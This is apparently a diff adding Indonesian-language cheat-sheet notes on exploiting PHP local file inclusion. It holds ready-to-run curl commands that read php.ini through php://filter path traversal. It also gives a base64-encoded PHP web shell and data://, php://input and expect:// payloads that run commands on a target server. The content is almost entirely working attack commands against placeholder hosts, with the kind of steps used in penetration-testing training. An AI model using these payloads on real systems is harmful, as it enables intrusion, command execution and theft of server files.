@@ -1,0 +1,59 @@
+# Cek PHP config
+cek apakah 
+```
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+---------------------------
+// atau pake
+---------------------------
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini"
+```
+
+cari hasil
+```
+allow_url_include = On
+```
+
+# RCE
+```
+echo '<?php system($_GET["cmd"]); ?>' | base64
+...
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+## Data Wrapper
+payload data wrapper
+```
+http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+---------------------------
+// atau pake curl
+---------------------------
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
+```
+
+## Input Wrapper
+payload pake input wrapper
+```
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
+```
+
+## Expect Wrapper
+cek coba  
+```
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+---------------------------
+// atau pake
+---------------------------
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/fpm/php.ini"
+```
+
+cari hasil
+```
+extension=expect
+```
+
+payload pake expect wrapper
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
+
